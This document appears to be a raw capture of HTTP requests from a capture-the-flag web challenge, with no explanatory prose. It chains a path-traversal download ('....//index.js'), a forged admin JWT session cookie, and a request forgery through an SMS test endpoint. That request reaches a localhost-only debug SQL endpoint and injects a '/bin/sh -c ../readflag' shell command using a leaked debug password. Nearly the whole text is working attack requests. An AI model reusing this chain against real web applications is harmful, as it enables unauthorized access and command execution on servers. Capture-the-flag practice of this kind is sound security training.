```
GET http://178.62.21.211:31184/download?resume=....//index.js HTTP/1.1
Host: 178.62.21.211:31184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjcwMTExNTg5fQ.Ds_-SIpPm9i33-KwAGaZWs5b860tA23EJo6zdM-onYk
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 0
```


```
POST http://178.62.21.211:31184/debug/sql/exec HTTP/1.1
Host: 178.62.21.211:31184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://178.62.21.211:31184/sql-prompt
Content-Type: application/json
Origin: https://178.62.21.211:31184
Content-Length: 59
Connection: keep-alive
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjcwMTExNTg5fQ.Ds_-SIpPm9i33-KwAGaZWs5b860tA23EJo6zdM-onYk
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"sql":"select * from enrollments","password":"DEBUG_PASS"}
```

```
{"message":"Blocked: This endpoint is whitelisted to localhost only."}
```

```
POST http://178.62.21.211:31184/api/sms/test HTTP/1.1
Host: 178.62.21.211:31184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://178.62.21.211:31184/sms-settings
Content-Type: application/json
Origin: https://178.62.21.211:31184
Content-Length: 376
Connection: keep-alive
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjcwMTExNTg5fQ.Ds_-SIpPm9i33-KwAGaZWs5b860tA23EJo6zdM-onYk
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"verb":"POST","url":"http://127.0.0.1:1337/debug/sql/exec","params":"{\"sql\": \".shell /bin/sh -c '../readflag'\", \"password\": \"CzliwZJkV60hpPJ\"}","headers":"Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjcwMTExNTg5fQ.Ds_-SIpPm9i33-KwAGaZWs5b860tA23EJo6zdM-onYk\nContent-Type: application/json","resp_ok":"<status>ok</status>","resp_bad":"<status>error</status>"}
```